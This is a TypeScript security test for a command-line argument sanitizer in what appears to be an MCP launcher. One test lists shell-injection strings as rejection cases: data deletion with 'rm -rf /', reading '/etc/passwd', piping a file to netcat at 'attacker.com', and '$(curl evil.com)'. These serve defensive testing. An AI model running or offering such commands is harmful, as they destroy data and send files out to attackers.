#!/usr/bin/env tsx

import assert from 'node:assert'

/**
 * Extract the sanitizeCommandLineArgs function for testing
 * We'll copy the function here to avoid modifying the main script
 */
function sanitizeCommandLineArgs(args: string[]): string[] {
  const safeArgs: string[] = []

  // Limit total number of arguments to prevent resource exhaustion
  if (args.length > 50) {
    console.warn(`Too many arguments provided (${args.length}), limiting to first 50`)
    args = args.slice(0, 50)
  }

  for (const arg of args) {
    // Check for potentially dangerous characters that could be used for shell injection
    if (typeof arg !== 'string') {
      console.warn(`Skipping non-string argument:`, arg)
      continue
    }

    // Reject empty arguments
    if (arg.length === 0) {
      continue
    }

    // Allow only safe characters: alphanumeric, hyphens, underscores, dots, forward slashes, colons, equals
    // This covers most legitimate MCP server arguments while blocking shell metacharacters
    // Specifically blocks: $, `, ;, |, &, >, <, (, ), [, ], {, }, *, ?, \, ", ', space, tab
    if (!/^[a-zA-Z0-9\-_./:=]+$/.test(arg)) {
      console.warn(`Skipping potentially unsafe argument: ${arg}`)
      continue
    }

    // Limit argument length to prevent buffer overflow attempts
    if (arg.length > 500) {
      console.warn(`Skipping oversized argument (${arg.length} chars)`)
      continue
    }

    // Additional validation: reject arguments that look like command injection attempts
    const suspiciousPatterns = [/&&/, /\|\|/, /;/, /\$\(/, /`/, /\$\{/, />/, /</, /\|/]

    if (suspiciousPatterns.some(pattern => pattern.test(arg))) {
      console.warn(`Skipping argument with suspicious pattern: ${arg}`)
      continue
    }

    safeArgs.push(arg)
  }

  return safeArgs
}

// Test runner
function runTests() {
  console.log('🧪 Running MCP Launcher Security Tests...\n')

  // Test: should allow safe arguments
  {
    const safeArgs = [
      '--port=3000',
      '--host=localhost',
      '--debug',
      'config.json',
      '/path/to/file.ts',
      'module-name',
      'value123',
      'snake_case_value',
      'kebab-case-value',
    ]

    const result = sanitizeCommandLineArgs(safeArgs)
    assert.deepStrictEqual(result, safeArgs, 'Should allow safe arguments')
    console.log('✅ Safe arguments test passed')
  }

  // Test: should reject shell injection attempts
  {
    const maliciousArgs = [
      '--port=3000; rm -rf /',
      '--host=`whoami`',
      '--debug && cat /etc/passwd',
      'config.json | nc attacker.com 1234',
      '$(curl evil.com)',
      '--value=${HOME}',
      'arg > /dev/null',
      'arg < input.txt',
      'arg1 || arg2',
      'arg1 && arg2',
    ]

    const result = sanitizeCommandLineArgs(maliciousArgs)
    assert.deepStrictEqual(result, [], 'Should reject all malicious arguments')
    console.log('✅ Shell injection rejection test passed')
  }

  // Test: should reject arguments with spaces and special characters
  {
    const unsafeArgs = [
      'arg with spaces',
      'arg\twith\ttabs',
      'arg\nwith\nnewlines',
      'arg"with"quotes',
      "arg'with'quotes",
      'arg\\with\\backslashes',
      'arg*with*wildcards',
      'arg?with?wildcards',
      'arg(with)parentheses',
      'arg[with]brackets',
      'arg{with}braces',
    ]

    const result = sanitizeCommandLineArgs(unsafeArgs)
    assert.deepStrictEqual(result, [], 'Should reject all unsafe arguments')
    console.log('✅ Special characters rejection test passed')
  }

  // Test: should reject empty arguments
  {
    const args = ['valid-arg', '', 'another-valid-arg']
    const result = sanitizeCommandLineArgs(args)
    assert.deepStrictEqual(
      result,
      ['valid-arg', 'another-valid-arg'],
      'Should filter out empty arguments'
    )
    console.log('✅ Empty arguments filtering test passed')
  }

  // Test: should reject oversized arguments
  {
    const longArg = 'a'.repeat(1000)
    const args = ['valid-arg', longArg, 'another-valid-arg']

    const result = sanitizeCommandLineArgs(args)
    assert.deepStrictEqual(
      result,
      ['valid-arg', 'another-valid-arg'],
      'Should filter out oversized arguments'
    )
    console.log('✅ Oversized arguments filtering test passed')
  }

  // Test: should limit total number of arguments
  {
    const manyArgs = Array(100).fill('valid-arg')
    const result = sanitizeCommandLineArgs(manyArgs)
    assert(result.length <= 50, 'Should limit to maximum 50 arguments')
    console.log('✅ Argument count limiting test passed')
  }

  // Test: should reject non-string arguments
  {
    const mixedArgs = [
      'valid-string',
      123 as any,
      { object: 'value' } as any,
      null as any,
      undefined as any,
      'another-valid-string',
    ]

    const result = sanitizeCommandLineArgs(mixedArgs)
    assert.deepStrictEqual(
      result,
      ['valid-string', 'another-valid-string'],
      'Should filter out non-string arguments'
    )
    console.log('✅ Non-string arguments filtering test passed')
  }
  // Test with empty array
  assert.deepStrictEqual(sanitizeCommandLineArgs([]), [], 'Should handle empty array')
  console.log('✅ Edge cases test passed')

  console.log('\n🎉 All security tests passed!')
}

// Run tests if this file is executed directly
if (import.meta.url === `file://${process.argv[1]}`) {
  runTests()
}
